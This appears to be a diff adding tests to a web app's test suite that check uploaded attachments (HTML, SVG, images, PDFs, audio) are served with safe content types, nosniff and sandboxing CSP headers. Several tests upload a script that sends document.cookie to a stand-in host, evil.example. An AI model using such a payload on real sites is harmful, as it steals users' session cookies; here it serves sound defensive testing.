@@ -58,6 +58,10 @@ function createMockResponse() {
     },
     on() {},
     once() {},
+    // Attachment bytes arrive via stream.pipe(), which announces itself.
+    emit() {
+      return false;
+    },
     destroyed: false,
     get writableEnded() {
       return ended;
@@ -930,6 +934,130 @@ describe("restore from an export", () => {
     const result = await restore(f, Buffer.from(JSON.stringify(data)), "data.json");
     expect(result.body.added).toMatchObject({ tasks: 2, files: 0 });
     expect(result.body.notes.join(" ")).toContain("only data.json was uploaded");
+  });
+});
+
+describe("serving attachments", () => {
+  const BOUNDARY = "----zephyrly-attachment-boundary";
+  let token = "";
+  let taskId = "";
+
+  beforeAll(async () => {
+    token = await login("attachment-serving@example.com");
+    const task = await invoke("/api/apps/test-app/entities/Task", {
+      method: "POST",
+      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
+      body: { title: "Has files", due_date: "2026-10-01" },
+    });
+    taskId = task.body.id;
+  });
+
+  /** Upload as a browser would, with the type the browser claims. */
+  const upload = async (filename, mimeType, bytes) => {
+    const result = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
+      method: "POST",
+      headers: { Authorization: `Bearer ${token}`, "Content-Type": `multipart/form-data; boundary=${BOUNDARY}` },
+      body: Buffer.concat([
+        Buffer.from(
+          `--${BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${mimeType}\r\n\r\n`
+        ),
+        Buffer.from(bytes),
+        Buffer.from(`\r\n--${BOUNDARY}--\r\n`),
+      ]),
+    });
+    expect(result.statusCode).toBe(201);
+    return result.body;
+  };
+  const open = (id, query = "") =>
+    invokeRaw(`/api/apps/test-app/attachments/${id}${query}`, { headers: { Authorization: `Bearer ${token}` } });
+  const script = "<script>fetch('https://evil.example/?c=' + document.cookie)</script>";
+
+  it("serves HTML as a download of opaque bytes, never as a page", async () => {
+    for (const [filename, type] of [
+      ["page.html", "text/html"],
+      ["page.htm", "TEXT/HTML; charset=utf-8"],
+      ["page.xhtml", "application/xhtml+xml"],
+    ]) {
+      const html = `<!doctype html><h1>Hi</h1>${script}`;
+      const { id } = await upload(filename, type, html);
+      const served = await open(id);
+      expect(served.statusCode).toBe(200);
+      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
+      expect(served.headers["Content-Disposition"]).toBe(`attachment; filename="${filename}"`);
+      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
+      expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox; default-src 'none'/);
+      expect(served.body.toString()).toBe(html);
+    }
+  });
+
+  it("doesn't serve an SVG inline as image/svg+xml, or count it as an image", async () => {
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg">${script}</svg>`;
+    const created = await upload("logo.svg", "image/svg+xml", svg);
+    expect(created).toMatchObject({ is_image: false, has_thumb: false });
+
+    for (const query of ["", "?thumb=1"]) {
+      const served = await open(created.id, query);
+      expect(served.headers["Content-Type"]).toBe("application/octet-stream");
+      expect(served.headers["Content-Disposition"]).toMatch(/^attachment;/);
+      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
+    }
+
+    // One uploaded before SVGs stopped counting as images: stored as an
+    // image, but the chip mustn't try to preview it.
+    db.prepare("UPDATE task_attachments SET is_image = 1 WHERE id = ?").run(created.id);
+    const listed = await invoke(`/api/apps/test-app/tasks/${taskId}/attachments`, {
+      headers: { Authorization: `Bearer ${token}` },
+    });
+    expect(listed.body.attachments.find((a) => a.id === created.id).is_image).toBe(false);
+  });
+
+  it("still previews images and PDFs in place, locked down", async () => {
+    const sharp = (await import("sharp")).default;
+    const png = await sharp({ create: { width: 800, height: 600, channels: 3, background: "#3366ff" } }).png().toBuffer();
+    const photo = await upload("photo.png", "image/png", png);
+    expect(photo).toMatchObject({ is_image: true, has_thumb: true });
+    const pdf = await upload("Boarding.pdf", "application/pdf", "%PDF-1.4 boarding pass");
+
+    for (const [id, query, type] of [
+      [photo.id, "", "image/png"],
+      [photo.id, "?thumb=1", "image/webp"],
+      [pdf.id, "", "application/pdf"],
+    ]) {
+      const served = await open(id, query);
+      expect(served.statusCode).toBe(200);
+      expect(served.headers["Content-Type"]).toBe(type);
+      expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
+      expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
+      expect(served.headers["Content-Security-Policy"]).toBe(
+        "sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'"
+      );
+    }
+    expect((await open(photo.id)).body.equals(png)).toBe(true);
+
+    // The download button still asks for a download, and keeps the real type.
+    const download = await open(pdf.id, "?download=1");
+    expect(download.headers["Content-Type"]).toBe("application/pdf");
+    expect(download.headers["Content-Disposition"]).toBe('attachment; filename="Boarding.pdf"');
+  });
+
+  it("plays audio and video in place, without a sandbox their player can't sign in from", async () => {
+    const memo = await upload("memo.m4a", "audio/x-m4a", "not really audio");
+    const served = await open(memo.id);
+    expect(served.headers["Content-Type"]).toBe("audio/x-m4a");
+    expect(served.headers["Content-Disposition"]).toMatch(/^inline;/);
+    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
+    const csp = served.headers["Content-Security-Policy"];
+    expect(csp).toContain("default-src 'none'");
+    expect(csp).toContain("media-src 'self'");
+    expect(csp).not.toContain("sandbox");
+  });
+
+  it("holds a file to the safe type it claimed, so a page can't pass as an image", async () => {
+    const { id } = await upload("cat.png", "image/png", `<!doctype html>${script}`);
+    const served = await open(id);
+    expect(served.headers["Content-Type"]).toBe("image/png");
+    expect(served.headers["X-Content-Type-Options"]).toBe("nosniff");
+    expect(served.headers["Content-Security-Policy"]).toMatch(/^sandbox;/);
   });
 });
 
